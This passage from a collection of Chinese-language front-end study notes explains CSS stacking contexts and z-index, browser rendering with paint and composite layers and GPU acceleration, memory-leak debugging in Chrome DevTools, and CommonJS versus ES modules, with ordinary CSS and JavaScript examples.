的定位子元素\n7. z-index 为正值的定位子元素（按照 z-index 值从小到大）\n\n### 3.1. 示例代码\n\n```css\n/* 堆叠顺序示例 */\n.stacking-context {\n    position: relative;\n    z-index: 0;\n}\n\n.negative-z-index {\n    position: absolute;\n    z-index: -1;\n    /* 将显示在背景之上，其他元素之下 */\n}\n\n.normal-flow {\n    /* 非定位元素，按照文档顺序堆叠 */\n}\n\n.float {\n    float: left;\n    /* 浮动元素在非定位元素之上 */\n}\n\n.inline {\n    display: inline;\n    /* 内联元素在浮动元素之上 */\n}\n\n.zero-z-index {\n    position: relative;\n    z-index: 0;\n    /* 在内联元素之上 */\n}\n\n.positive-z-index {\n    position: absolute;\n    z-index: 1;\n    /* 在最上层 */\n}\n```\n\n## 4. 堆叠上下文的特性\n\n### 4.1. 层级包含性\n\n- 子堆叠上下文被完全包含在父堆叠上下文之内\n- 子元素无法穿透父元素的堆叠层级\n\n```css\n/* 父元素创建堆叠上下文 */\n.parent {\n    position: relative;\n    z-index: 1;\n}\n\n/* 子元素的 z-index 只在父元素内部比较 */\n.child {\n    position: absolute;\n    z-index: 999; /* 不会影响父元素外的元素 */\n}\n```\n\n### 4.2. 兄弟关系\n\n```css\n/* 两个独立的堆叠上下文 */\n.context-1 {\n    position: relative;\n    z-index: 1;\n}\n\n.context-2 {\n    position: relative;\n    z-index: 2;\n    /* 会在 context-1 之上，无论子元素的 z-index 多大 */\n}\n```\n\n## 5. 实际应用场景\n\n### 5.1. 模态框（Modal）\n\n```css\n.modal-overlay {\n    position: fixed;\n    z-index: 100;\n    background: rgba(0, 0, 0, 0.5);\n}\n\n.modal-content {\n    position: fixed;\n    z-index: 101;\n}\n```\n\n### 5.2. 下拉菜单\n\n```css\n.dropdown {\n    position: relative;\n}\n\n.dropdown-content {\n    position: absolute;\n    z-index: 1;\n}\n```\n\n### 5.3. 固定导航栏\n\n```css\n.navbar {\n    position: fixed;\n    top: 0;\n    z-index: 1000; /* 确保在其他内容之上 */\n}\n```\n\n## 6. z-index\n\n### 6.1. 基本概念\n\nz-index 是 CSS 中用于控制元素在 z 轴上**堆叠顺序**的属性。它决定了元素在重叠时哪个元素显示在上层。\n\n1. z-index **只在创建了堆叠上下文的元素中生效**\n2. **堆叠上下文**形成独立的层级体系\n3. 多种 CSS 属性都可能创建新的堆叠上下文\n4. 合理使用堆叠规则可以创建复杂的层叠效果\n\n取值范围\n\n```css\nz-index: auto;          /* 默认值 */\nz-index: 0;            /* 整数值 */\nz-index: 999;          /* 正整数 */\nz-index: -1;           /* 负整数 */\nz-index: inherit;      /* 继承父元素 */\nz-index: initial;      /* 初始值 */\nz-index: unset;        /* 未设置 */\n```\n\n## 7. 其他\n\n### 7.1. z-index 管理策略：使用变量\n\n```css\n/* 使用变量管理 z-index */\n:root {\n    --z-dropdown: 100;\n    --z-sticky: 200;\n    --z-fixed: 300;\n    --z-modal-backdrop: 400;\n    --z-modal: 500;\n    --z-popover: 600;\n    --z-tooltip: 700;\n}\n\n.dropdown { z-index: var(--z-dropdown); }\n.sticky-header { z-index: var(--z-sticky); }\n.fixed-nav { z-index: var(--z-fixed); }\n.modal-backdrop { z-index: var(--z-modal-backdrop); }\n.modal { z-index: var(--z-modal); }\n.popover { z-index: var(--z-popover); }\n.tooltip { z-index: var(--z-tooltip); }\n```\n\n### 7.2. 调试技巧\n\n```css\n/* 使用 outline 调试重叠元素 */\n* {\n    outline: 1px solid red;\n}\n\n/* 使用不同颜色标识不同堆叠上下文 */\n.stacking-context {\n    background: rgba(255, 0, 0, 0.1);\n}\n\n/* 使用不同颜色的轮廓线标识堆叠上下文 */\n.debug-stacking {\n    outline: 2px solid red;\n}\n\n/* 临时提升元素层级进行测试 */\n.debug-top {\n    position: relative;\n    z-index: 999999;\n}\n```\n\n### 7.3. z-index 失效\n\n```css\n/* 问题：z-index 不生效 */\n.element {\n    z-index: 999; /* 无效 */\n}\n\n/* 解决方案：添加定位属性 */\n.element {\n    position: relative;\n    z-index: 999; /* 现在生效了 */\n}\n```\n\n### 7.4. 层级穿透\n\n```css\n/* 问题：子元素超出父元素层级 */\n.parent {\n    position: relative;\n    z-index: 1;\n}\n\n/* 解决方案：确保父元素 z-index 足够高 */\n.parent {\n    position: relative;\n    z-index: 1000;\n}\n```\n\n### 7.5. 隔离堆叠上下文\n\n```css\n/* 使用 isolation 创建新的堆叠上下文 */\n.isolated-context {\n    isolation: isolate;\n}\n```\n\n### 7.6. 常见问题\n\n- z-index 不生效\n- 元素无法置于顶层\n- 层级关系混乱\n\n### 7.7. 最佳实践\n\n```css\n/* 使用 CSS 变量管理 z-index */\n:root {\n    --z-dropdown: 100;\n    --z-modal: 1000;\n    --z-tooltip: 1500;\n    --z-notification: 2000;\n}\n\n/* 使用语义化的类名和合理的层级值 */\n.dropdown { z-index: var(--z-dropdown); }\n.modal { z-index: var(--z-modal); }\n.tooltip { z-index: var(--z-tooltip); }\n.notification { z-index: var(--z-notification); }\n```\n","MLGEykBV":"\n# 浏览器的渲染原理\n\n`#bom` \n\n\n## 目录\n<!-- toc -->\n ## 1. 浏览器是如何把网页渲染到显示器上的 \n\n![图片&文件](./files/20241025-6.png)\n\n## 2. 重排、重绘、合成\n\n注意点：\n- 主线程与非主线程\n- 渲染路径：重排 > 重绘 > 合成，如下图\n- 合成\n\t- 直接在**非主线程**上执行合成动画操作\n\t- 合成层的transform、opacity修改，只需要将多个图层再次合并，而后生成位图，最终展示到屏幕上\n\n![图片&文件](./files/20241025-8.png)\n\n## 3. 渲染流程、渲染层、合成层、开启 GPU 加速的关系\n\n### 3.1. 渲染过程概述\n\n首先,让我们简要回顾一下浏览器的基本渲染过程:\n![图片&文件](./files/20241025-9.png)\n\n1) 解析HTML构建DOM树\n2) 解析CSS构建CSSOM树\n3) 将DOM和CSSOM合并成渲染树(Render Tree)\n4) 布局(Layout):计算每个可见元素的几何信息\n5) 绘制(Paint):将渲染树中的各个节点绘制到屏幕上\n6) 合成(Compositing): **将不同的绘制层合成到一起**\n\n![图片&文件](./files/20241025-11.png)\n\n### 3.2. 渲染层和合成层主要区别\n\n![图片&文件](./files/20241025-13.png)\n\n### 3.3. 渲染层\n\n>  更多见 [8. 渲染层（Paint Layer）和合成层（Composite Layer）](/post/uIdFSFIb.html)\n\n**渲染层**的概念跟“**层叠上下文**”密切相关，简单来说，拥有z-index属性的定位元素会生成一个层叠上下文，一个生成层叠上下文的元素就生成了一个渲染层\n\n形成`渲染层`的条件也就是**形成层叠上下文**的条件\n\n- document 元素\n- 拥有z-index 属性的定位元素（position: relative|fixed|sticky|absolute）\n- 弹性布局的子项（父元素display:flex|inline-flex)，并且 z-index 不是auto时\n- opacity 非 1 的元素\n- transform 非 none 的元素\n- filter非none的元素\n- will-change = opacity | transform | filter\n- 此外需要剪裁的元素也会形成一个渲染层，也就是overflow不是visible的元素\n\n### 3.4. 合成层(Compositing Layer)\n\n- 定义: **可以独立于普通文档流中的其他层进行绘制和缓存**。\n- 特点: 合成层的内容会被**缓存**为一个独立的图像,可以直接用于显示。\n- 优势: 合成层的更新不会影响其他层,可以提高渲染性能。\n\n#### 3.4.1. 在开发者工具看到的全部都是合成层\n\n![图片&文件](./files/20241025-12.png)\n\n#### 3.4.2. 创建合成层的条件\n\n下面这些条件属于**生成渲染层的“加强版”**，也就是说形成合成层的条件要更苛刻\n\n| 条件                             | 说明                             | 示例                                                                                                   |\n| ------------------------------ | ------------------------------ | ---------------------------------------------------------------------------------------------------- |\n| 3D 或透视变换 CSS 属性                | 使用 3D 变换可以创建合成层                | `transform: translateZ(0);`<br>`transform: translate3d(0,0,0);`<br>`transform: perspective(1000px);` |\n| 包含硬件加速的 2D 变换                  | 某些 2D 变换也可能触发合成层               | `transform: translateZ(0);`                                                                          |\n| `will-change` 属性               | 预先告知浏览器元素可能发生的变化               | `will-change: transform;`<br>`will-change: opacity;`<br>`will-change: top, left, bottom, right;`     |\n| 应用 `animation` 或 `transition`  | 对特定属性应用动画或过渡效果                 | 适用于 `opacity`, `transform`, `filter`, `backdrop-filter`                                              |\n| `position: fixed`              | 固定定位的元素会创建合成层                  | `position: fixed;`                                                                                   |\n| 具有 `alpha` 通道或使用 `mask`/`clip` | 半透明元素或使用遮罩/剪切的元素               | `opacity: 0.9;`<br>`mask-image: url(mask.png);`                                                      |\n| 使用 CSS `filter` 属性             | 应用滤镜效果                         | `filter: blur(5px);`                                                                                 |\n| 后代元素中存在合成层                     | 如包含 `<video>` 或 `<iframe>` 等标签 | `<div><video src=\"...\"></video></div>`                                                               |\n| CSS `reflection` 属性            | 使用倒影效果                         | `-webkit-box-reflect: below 1px linear-gradient(transparent, `#0004);``                                |\n| `mix-blend-mode` 属性            | 设置元素的内容应该与父元素的内容混合             | `mix-blend-mode: multiply;`                                                                          |\n| CSS 动画的 `@keyframe` 规则         | 使用关键帧动画                        | `@keyframes example { ... }`                                                                         |\n| `<video>` 元素                   | 视频元素通常会创建合成层                   | `<video src=\"...\"></video>`                                                                          |\n| 使用 WebGL 的 `<canvas>` 元素       | WebGL 内容会触发合成层                 | `<canvas id=\"webgl-canvas\"></canvas>`                                                                |\n| 硬件加速的 `<iframe>` 元素            | 嵌入的 iframe 可能创建合成层             | `<iframe src=\"...\"></iframe>`                                                                        |\n| 使用剪裁（clip）或遮罩（mask）属性          | 应用复杂的剪裁或遮罩效果                   | `clip-path: circle(50%);`                                                                            |\n| CSS 多列布局                       | 使用多列布局可能触发合成层                  | `column-count: 3;`<br>`column-width: 100px;`                                                         |\n| CSS regions                    | 使用区域布局                         | 较少使用，主要在特定布局中                                                                                        |\n| CSS `isolation` 属性             | 创建新的堆叠上下文                      | `isolation: isolate;`                                                                                |\n| `z-index` 属性                   | 在某些情况下可能触发合成层                  | `z-index: 100;`                                                                                      |\n\n### 3.5. GPU加速\n\n- 定义: GPU加速是指利用图形处理器(GPU)来加速页面渲染和动画执行。\n- 原理: 通过将某些渲染任务转移到GPU上处理,可以显著提高性能。\n- 触发: **创建合成层通常会触发GPU加速**。\n\n创建合成层的条件和开启 GPU 3D 加速的条件虽然有很大的重叠，但并不完全相同，具体如下表：\n\n![图片&文件](./files/20241025-10.png)\n\n### 3.6. 新开GPU加速\n\n\"新开GPU加速\"通常指的是某个元素因为特定的CSS属性或DOM操作而创建了新的合成层,从而触发了GPU加速。这个过程包括:\n\n1) 元素被提升为独立的**合成层**\n2) 该层的渲染被转移到GPU上处理\n3) GPU独立处理该层的绘制和合成\n\n### 3.7. 实际应用和注意事项\n\n- 性能优化: 合理使用合成层可以提高动画性能和页面滚动流畅度。\n- 过度使用的问题: 创建过多的合成层可能会增加内存使用,反而降低性能。\n- 调试工具: Chrome DevTools的 \"Layers\" 面板可以帮助可视化和调试复合层\n\n### 3.8. 代码示例\n\n触发GPU加速的CSS示例:\n\n```css\n.gpu-accelerated {\n  transform: translateZ(0);\n  will-change: transform;\n}\n```\n\n这段CSS会强制创建一个**新的合成层**,并触发GPU加速。\n\n### 3.9. 最佳实践\n\n- 只在需要的地方使用GPU加速\n- 使用 will-change 属性来提前告知浏览器即将发生的变化\n- 避免大量使用固定定位元素\n- 对于不需要频繁重绘的元素, 考虑**使用 opacity 和 transform 来实现动画效果**\n\n### 3.10. 注意项\n\n如果有一个元素，它的兄弟元素在复合层中渲染，而这个兄弟元素的`z-index`比较小，那么这个元素（不管是不是应用了硬件加速样式）也会被放到复合层\n\n换言之，浏览器有可能给复合层之后的所有相对或绝对定位的元素都创建一个`合成层`来渲染\n\n所以，使用3D硬件加速提升动画性能时，最好给元素增加一个`z-index`属性，**人为干扰复合层的排序**，可以有效减少chrome创建不必要的复合层，提升渲染性能，移动端优化效果尤为明显\n\n### 3.11. 复合层 = 合成层","lmTJCvA3":"\n# 渲染层、复合层、层叠上下文对比\n\n`#浏览器` \n\n\n## 目录\n<!-- toc -->\n ## 1. 渲染层（Paint Layer） \n\n渲染层是浏览器渲染过程中的基本单位，主要用于==管理元素的绘制顺序==。\n\n**触发条件**：\n\n```css\n/* 以下属性会创建新的渲染层 */\n.paint-layer {\n    /* 1. position 定位 */\n    position: fixed;\n    position: absolute;\n    position: relative;\n\n    /* 2. 透明度 */\n    opacity: 1;\n\n    /* 3. 溢出 */\n    overflow: scroll;\n    overflow: auto;\n\n    /* 4. CSS 滤镜 */\n    filter: blur(5px);\n\n    /* 5. CSS mix-blend-mode 属性 */\n    mix-blend-mode: multiply;\n\n    /* 6. transform */\n    transform: scale(1);\n}\n```\n\n## 2. 合成层（Compositing Layer）\n\n合成层是一种特殊的渲染层，会被单独绘制并由 GPU 合成。\n\n**触发条件**：\n\n```css hl:10\n.compositing-layer {\n    /* 1. 3D 或透视变换 */\n    transform: translate3d(0, 0, 0);\n    transform: translateZ(0);\n\n    /* 2. will-change */\n    will-change: transform;\n    will-change: opacity;\n\n    /* 3. opacity 小于 1 */\n    opacity: 0.9;\n\n    /* 4. position: fixed */\n    position: fixed;\n\n    /* 5. filter */\n    filter: blur(5px);\n\n    /* 6. backdrop-filter */\n    backdrop-filter: blur(5px);\n}\n\n/* 7. <video>, <canvas>, <iframe> 等元素 */\n```\n\n## 3. 层叠上下文（Stacking Context）\n\n==层叠上下文是 HTML 元素在三维空间中的概念，决定了元素在 z 轴上的显示顺序==。\n\n**触发条件**：\n\n```css\n.stacking-context {\n    /* 1. 文档根元素 <html> */\n    \n    /* 2. position + z-index */\n    position: relative;\n    z-index: 1;\n\n    /* 3. flex 子项设置 z-index */\n    display: flex;\n    z-index: 1;\n\n    /* 4. opacity 小于 1 */\n    opacity: 0.9;\n\n    /* 5. transform 不为 none */\n    transform: scale(1);\n\n    /* 6. filter 不为 none */\n    filter: blur(0);\n\n    /* 7. isolation */\n    isolation: isolate;\n\n    /* 8. mix-blend-mode 不为 normal */\n    mix-blend-mode: multiply;\n\n    /* 9. will-change */\n    will-change: opacity;\n\n    /* 10. contain */\n    contain: layout;\n}\n```\n\n## 4. 三者的关系\n\n### 4.1. **层级关系**：\n\n```\n浏览器渲染\n└── 层叠上下文（决定 z 轴顺序）\n    └── 渲染层（基本绘制单位）\n        └── 合成层（GPU 加速）\n```\n\n### 4.2. **示例代码**：\n\n```html\n<div class=\"stacking-context\">\n    <div class=\"paint-layer\">\n        <div class=\"compositing-layer\">\n            内容\n        </div>\n    </div>\n</div>\n```\n\n```css\n.stacking-context {\n    position: relative;\n    z-index: 1;\n}\n\n.paint-layer {\n    position: relative;\n    background: `#fff;`\n}\n\n.compositing-layer {\n    transform: translateZ(0);\n}\n```\n\n## 5. 性能影响\n\n### 5.1. **渲染层**：\n\n```css\n/* 渲染层的改变会导致重绘 */\n.paint-layer {\n    background: red;  /* 改变会触发重绘 */\n}\n```\n\n### 5.2. **合成层**：\n\n```css\n/* 合成层的改变通常只需要 GPU 重新合成 */\n.compositing-layer {\n    transform: translateX(100px);  /* 只需要 GPU 合成 */\n}\n```\n\n### 5.3. **层叠上下文**：\n\n```css\n/* 层叠上下文的改变可能影响大量子元素 */\n.stacking-context {\n    z-index: 2;  /* 可能影响整个子树的渲染 */\n}\n```\n\n## 6. 调试方法\n\n### 6.1. **Chrome DevTools**：\n\n```javascript hl:2\n// 1. 查看层叠上下文\n// - Elements 面板中的 3D View\n\n// 2. 查看渲染层和合成层\n// - Layers 面板\n// - 在 Rendering 中启用 Layer borders\n```\n\n#### 6.1.1. edge\n\n![图片&文件](./files/20241227-1.png)\n\n#### 6.1.2. chrome\n\n![图片&文件](./files/20241227.png)\n\n## 7. 最佳实践\n\n1. **合理使用合成层**：\n```css\n/* 对于频繁动画的元素 */\n.animated {\n    will-change: transform;\n    transform: translateZ(0);\n}\n```\n\n2. **避免层爆炸**：\n```css\n/* 不要在大量元素上使用触发合成层的属性 */\n.many-items {\n    transform: translateZ(0); /* 避免 */\n}\n```\n\n3. **优化层叠上下文**：\n```css\n/* 使用 isolation 创建新的层叠上下文 */\n.new-context {\n    isolation: isolate;\n}\n```\n\n4. **性能优化**：\n```css\n/* 对于静态内容，尽量使用渲染层 */\n.static-content {\n    /* 普通样式即可 */\n}\n\n/* 对于动画内容，考虑使用合成层 */\n.animated-content {\n    will-change: transform;\n}\n```\n\n","uIdFSFIb":"\n# 渲染层（Paint Layer）和合成层（Composite Layer）\n\n`#bom` \n\n\n## 目录\n<!-- toc -->\n ## 1. 基本概念 \n\n### 1.1. 渲染层（Paint Layer）\n\n- 浏览器的**普通渲染层**\n- 主要负责页面元素的绘制\n- 共用同一个**绘图上下文**\n- 在**主线程**中进行绘制\n\n### 1.2. 合成层（Composite Layer）\n\n- 独立的图形层\n- 拥有单独的图形上下文\n- 可以利用 GPU 加速\n- 在**合成线程**中进行处理\n\n## 2. 详细对比\n\n### 2.1. 创建条件\n\n#### 2.1.1. 渲染层（Paint Layer）触发条件：\n\n```css\n.paint-layer {\n    /* 1. 根元素 <html> */\n    \n    /* 2. 有定位属性的元素 */\n    position: relative | absolute | fixed | sticky;\n    \n    /* 3. 透明的元素 */\n    opacity: 0.9;\n    \n    /* 4. 有 CSS 滤镜的元素 */\n    filter: blur(5px);\n    \n    /* 5. 有 CSS mix-blend-mode 属性的元素 */\n    mix-blend-mode: multiply;\n    \n    /* 6. 有 CSS transform 属性的元素 */\n    transform: scale(1.1);\n    \n    /* 7. overflow 不为 visible 的元素 */\n    overflow: hidden | auto | scroll;\n}\n```\n\n#### 2.1.2. 关于 opacity\n\n1. opacity < 1 时\n\t- 会创建**合成层**（Compositing Layer）\n\t- 会触发GPU加速\n\t- 不会影响子元素的渲染\n2. opacity = 1 时\n\t- 只是普通的**渲染层**（Paint Layer）\n\t- 不会创建新的合成层\n\t- 不会触发 GPU 加速\n\n#### 2.1.3. 合成层（Composite Layer）触发条件：\n\n```css\n.composite-layer {\n    /* 1. 3D 或透视变换 */\n    transform: translate3d(0, 0, 0);\n    transform: translateZ(0);\n    \n    /* 2. 对 opacity、transform、filter 等属性进行动画 */\n    animation: slide 1s ease;\n    \n    /* 3. will-change 属性 */\n    will-change: transform | opacity;\n    \n    /* 4. 具有加速视频解码的 <video> 元素 */\n    \n    /* 5. 3D 绘图上下文的 <canvas> 元素 */\n    \n    /* 6. 混合插件内容 */\n    \n    /* 7. 具有 CSS 滤镜效果的元素 */\n    filter: blur(5px);\n    \n    /* 8. 剪裁（clip）或遮罩（mask）中包含合成层的元素 */\n    clip-path: circle(50%);\n    -webkit-mask: linear-gradient(#000, transparent);\n}\n```\n\n### 2.2. 性能特征\n\n#### 2.2.1. 渲染层：\n\n```javascript\n// 渲染层的更新过程\ndocument.querySelector('.paint-layer').style.left = '100px';\n// 1. 重新计算样式\n// 2. 重新布局\n// 3. 重新绘制整个渲染层\n// 4. 合成显示\n```\n\n#### 2.2.2. 合成层：\n\n```javascript\n// 合成层的更新过程\ndocument.querySelector('.composite-layer').style.transform = 'translateX(100px)';\n// 1. 直接在 GPU 中处理变换\n// 2. 无需重新布局和绘制\n// 3. 仅需要合成显示\n```\n\n### 2.3. 只为容器创建合成层\n\n```javascript hl:13\n// 不当使用合成层可能导致内存问题\nfunction badPractice() {\n    const elements = document.querySelectorAll('.element');\n    elements.forEach(el => {\n        // 不要为太多元素强制创建合成层\n        el.style.transform = 'translateZ(0)';\n    });\n}\n\n// 推荐做法\nfunction goodPractice() {\n    const container = document.querySelector('.container');\n    // 只为容器创建合成层\n    container.style.transform = 'translateZ(0)';\n}\n```\n\n### 2.4. 使用场景\n\n#### 2.4.1. 渲染层适用场景：\n\n```css\n/* 1. 静态内容 */\n.static-content {\n    position: relative;\n    background: `#fff;`\n}\n\n/* 2. 简单的悬浮效果 */\n.hover-effect {\n    position: relative;\n}\n.hover-effect:hover {\n    background: `#f0f0f0;`\n}\n```\n\n#### 2.4.2. 合成层适用场景：\n\n```css\n/* 1. 固定定位的头部或侧边栏 */\n.header {\n    position: fixed;\n    top: 0;\n    width: 100%;\n    transform: translateZ(0);\n}\n\n/* 2. 滚动内容 */\n.scroll-container {\n    overflow: auto;\n    will-change: transform;\n}\n\n/* 3. 动画元素 */\n.animated-element {\n    animation: slide 1s ease infinite;\n    will-change: transform;\n}\n```\n\n### 2.5. 调试和优化\n\n#### 2.5.1. Chrome DevTools 中的调试：\n\n1. 打开 Chrome DevTools\n2. 使用 `Layers 面板`查看层信息\n3. 使用 `Performance` 面板分析性能\n\n```javascript hl:1,7,12\n// 优化建议\nfunction optimizePerformance() {\n    // 1. 合理使用 will-change\n    const animatedElement = document.querySelector('.animated');\n    animatedElement.style.willChange = 'transform';\n    \n    // 2. 动画结束后移除 will-change\n    animatedElement.addEventListener('animationend', () => {\n        animatedElement.style.willChange = 'auto';\n    });\n    \n    // 3. 使用 transform 替代改变位置的属性\n    // 不推荐\n    element.style.left = '100px';\n    // 推荐\n    element.style.transform = 'translateX(100px)';\n}\n```\n\n### 2.6. 最佳实践\n\n```css\n/* 1. 合理使用合成层 */\n.optimal-composite {\n    /* 只在需要的元素上使用 */\n    transform: translateZ(0);\n    will-change: transform;\n}\n\n/* 2. 避免层爆炸 */\n.container {\n    /* 在容器上创建合成层，而不是每个子元素 */\n    transform: translateZ(0);\n}\n.container > * {\n    /* 子元素不需要单独创建合成层 */\n    transform: none;\n}\n\n/* 3. 使用 CSS 动画 */\n@keyframes slide {\n    from { transform: translateX(0); }\n    to { transform: translateX(100px); }\n}\n\n.animated {\n    animation: slide 1s ease;\n    will-change: transform;\n}\n```\n\n### 2.7. 注意事项\n\n- **内存使用**\n\t- 合成层会占用额外的内存\n\t- 需要权衡性能和内存使用\n- **层爆炸**\n\t- 避免创建过多的合成层\n\t- 合理管理层级结构\n- **硬件加速**\n\t- 合成层会启用 GPU 加速\n\t- 需要考虑设备性能差异\n- **调试工具**\n\t- 使用 Chrome DevTools 监控层的使用\n\t- 分析性能瓶颈\n- **兼容性**\n\t- 考虑不同浏览器的支持情况\n\t- 提供降级方案\n\n","dEQTp136":"\n# 渲染层（Paint Layer）和层叠上下文（Stacking Context）\n\n`#bom` \n\n\n## 目录\n<!-- toc -->\n ## 1. 基本概念 \n\n### 1.1. 层叠上下文（Stacking Context）\n\n- 是 HTML 元素在 Z 轴上的层叠**规则**\n- 决定元素的显示顺序\n- 是一个**逻辑概念**，用于管理元素的层叠顺序\n\n### 1.2. 渲染层（Paint Layer）\n\n- 是浏览器渲染过程中的**实际图层**\n- 负责元素的绘制\n- 是一个**物理概念**，用于浏览器渲染优化\n\n## 2. 详细关系分析\n\n### 2.1. 创建条件对比\n\n```css\n/* 层叠上下文触发条件 */\n.stacking-context {\n    /* 1. 文档根元素 <html> */\n    \n    /* 2. position + z-index */\n    position: relative | absolute | fixed;\n    z-index: 1;\n    \n    /* 3. opacity 小于 1 */\n    opacity: 0.9;\n    \n    /* 4. transform 不为 none */\n    transform: scale(1.1);\n    \n    /* 5. filter 不为 none */\n    filter: blur(1px);\n    \n    /* 6. isolation: isolate */\n    isolation: isolate;\n    \n    /* 7. mix-blend-mode 不为 normal */\n    mix-blend-mode: multiply;\n    \n    /* 8. perspective 不为 none */\n    perspective: 1000px;\n}\n\n/* 渲染层触发条件 */\n.paint-layer {\n    /* 1. 页面根元素 */\n    \n    /* 2. 有定位属性 */\n    position: relative | absolute | fixed;\n    \n    /* 3. 透明度 */\n    opacity: 0.9;\n    \n    /* 4. 变换 */\n    transform: scale(1.1);\n    \n    /* 5. overflow 不为 visible */\n    overflow: hidden;\n    \n    /* 6. filter */\n    filter: blur(1px);\n}\n```\n\n### 2.2. 层叠顺序和渲染关系\n\n```css\n/* 层叠顺序示例 */\n.container {\n    position: relative; /* 创建层叠上下文 */\n    /* 同时也可能创建渲染层 */\n}\n\n.child1 {\n    position: absolute;\n    z-index: 1;\n    /* 在层叠上下文中的顺序为 1 */\n}\n\n.child2 {\n    position: absolute;\n    z-index: 2;\n    transform: translateZ(0);\n    /* 在层叠上下文中的顺序为 2 */\n    /* 同时会创建新的渲染层 */\n}\n```\n\n### 2.3. 嵌套关系\n\n```css\n/* 层叠上下文的嵌套 */\n.parent {\n    position: relative;\n    z-index: 1;\n    /* 创建层叠上下文 */\n}\n\n.child {\n    position: relative;\n    z-index: 999;\n    /* 创建子层叠上下文 */\n    /* z-index 只在父层叠上下文中比较 */\n}\n\n/* 渲染层的嵌套 */\n.container {\n    transform: translateZ(0);\n    /* 创建渲染层 */\n}\n\n.nested {\n    opacity: 0.9;\n    /* 可能创建新的渲染层 */\n    /* 具体是否创建取决于浏览器的优化策略 */\n}\n```\n\n### 2.4. 性能影响\n\n```css\n/* 层叠上下文的性能影响 */\n.stacking-context-example {\n    position: relative;\n    z-index: 1;\n    /* 主要影响布局计算 */\n}\n\n/* 渲染层的性能影响 */\n.paint-layer-example {\n    transform: translateZ(0);\n    /* 影响内存使用和 GPU 加速 */\n}\n\n/* 同时影响两者的属性 */\n.both-affected {\n    opacity: 0.9;\n    /* 1. 创建层叠上下文 */\n    /* 2. 可能创建新的渲染层 */\n}\n```\n\n### 2.5. 实际应用场景\n\n```css\n/* 1. 模态框示例 */\n.modal-overlay {\n    position: fixed;\n    z-index: 100;\n    background: rgba(0, 0, 0, 0.5);\n    /* 创建层叠上下文确保遮罩在最上层 */\n    /* 同时因为 position: fixed 创建渲染层 */\n}\n\n/* 2. 滚动容器 */\n.scroll-container {\n    position: relative;\n    overflow: auto;\n    /* 创建渲染层优化滚动性能 */\n    will-change: transform;\n}\n\n/* 3. 下拉菜单 */\n.dropdown {\n    position: absolute;\n    z-index: 10;\n    /* 创建层叠上下文控制显示顺序 */\n    transform: translateZ(0);\n    /* 创建渲染层优化动画性能 */\n}\n```\n\n### 2.6. 调试方法\n\n```javascript\n// 检查层叠上下文\nfunction checkStackingContext(element) {\n    const styles = window.getComputedStyle(element);\n    const properties = [\n        'opacity',\n        'transform',\n        'filter',\n        'position',\n        'z-index'\n    ];\n    \n    return properties.some(prop => {\n        const value = styles[prop];\n        return value && value !== 'none' && value !== 'static';\n    });\n}\n\n// 使用 Chrome DevTools 检查渲染层\n// 1. 打开 DevTools\n// 2. 按 Esc 打开 Drawer\n// 3. 选择 Layers 面板\n```\n\n### 2.7. 最佳实践\n\n>  可使用 `isolation` **创建新的层叠上下文**\n\n```css\n/* 1. 合理使用层叠上下文 */\n.modal {\n    position: fixed;\n    z-index: 1000;\n    /* 使用较大的 z-index 确保显示在最上层 */\n}\n\n/* 2. 优化渲染层创建 */\n.optimized-container {\n    /* 在父容器创建渲染层 */\n    transform: translateZ(0);\n}\n\n.optimized-container * {\n    /* 避免子元素创建不必要的渲染层 */\n    transform: none;\n}\n\n/* 3. 处理重叠元素 */\n.overlapping-elements {\n    position: relative;\n    /* 使用 isolation 创建新的层叠上下文 */\n    isolation: isolate;\n}\n```\n\n## 3. 注意事项\n\n- **层叠上下文的特点**：\n\t- 层叠上下文是相对的\n\t- 子元素的 `z-index` 只在父层叠上下文中比较\n\t- 不会影响到其他层叠上下文\n- **渲染层的考虑**：\n\t- 避免创建过多渲染层\n\t- 注意内存使用\n\t- 合理使用 GPU 加速\n- **性能优化**：\n\t- 合理管理层叠上下文的嵌套\n\t- 控制渲染层的数量\n\t- 使用适当的 CSS 属性\n- **浏览器差异**：\n\t- 不同浏览器的渲染策略可能不同\n\t- 层叠上下文的行为较为统一\n\t- 渲染层的创建可能因浏览器而异\n\n总的来说，层叠上下文和渲染层是**两个相关但不完全重叠**的概念：\n- 层叠上下文主要控制元素的视觉层级顺序\n- 渲染层主要影响浏览器的渲染性能和优化\n- 某些 CSS 属性可能同时影响两者\n- 理解两者的关系有助于开发更高性能的网页","xyGXILev":"\n# 浏览器中如何查找内存泄漏\n\n`#bom` `#R1` \n\n- 内存泄漏是指程序中已分配的内存由于某些原因无法被正常释放。\n- 在前端开发中，常见的内存泄漏场景包括未清除的事件监听器、定时器、闭包引用等。\n- 我们可以通过 \n\t- Chrome DevTools 的 `Memory` 面板来检测内存泄漏\n\t\t- ==内存分配时间线分析，主动出发垃圾回收看看是否回收==\n\t\t\t- ![图片&文件](./files/20241026-7.png)\n\t- 编码检测\n\t\t- ![图片&文件](./files/20241026-8.png)\n- 在实际项目中，我会特别注意在组件卸载时清理副作用\n\t- 使用 WeakMap/WeakSet 来处理缓存，避免闭包滥用。\n\t\t- 同时，我们团队也建立了完整的**性能监控体系**，包括自动化的内存泄漏检测","hN6h8nAB":"\n# 前言\n\n`#nodejs`\n\n> Nodejs 相关\n\n\n目录：\n\n- [26. 实现一个简易版的 Koa](/post/ADSRkHdp.html)\n\n","QscasT3t":"\n# cjs 与 esm\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. cjm / esm 的区别 \n\n### 1.1. 引用与拷贝\n\n- ESM 输出的是`值的引用`\n- 而 CJS 输出的是`值的拷贝`\n\n### 1.2. 运行时与编译时\n\n- CJS 的输出是`运行时加载`\n- 而 ESM 是 `编译时` 输出接口\n\n### 1.3. 同步与异步\n\n- CJS是`同步加载`，ESM是`异步加载`； \n\t- 同步是服务器代码都在**本地**，浏览器需要去**异步**拿\n\t- ![图片&文件](./files/20241027-1.png)\n\n### 1.4. 动态加载\n\n- 都支持 `动态加载`\n\t- ![图片&文件](./files/20241027-2.png)\n\n### 1.5. 文件扩展名与 `package.json`配置\n\n- ![图片&文件](./files/20241027-3.png)\n\n### 1.6. 顶级 `await` 支持\n\n![图片&文件](./files/20241027-4.png)\n\n### 1.7. `this` 指向\n\n![图片&文件](./files/20241027-5.png)\n\n>  ??? 如果直接在浏览器中 `console.log(this)` 打印出 `window` ？ 为什么\n\n### 1.8. **循环引用**的处理差异\n\n- CommonJS\n\t- 模块在首次 `require` 时会被 `缓存`\n\t\t- 因为是`缓存` ，所以避免了 **无限循环**\n\t- 如果出现循环引用，会返回未完成的导出对象\n\t- 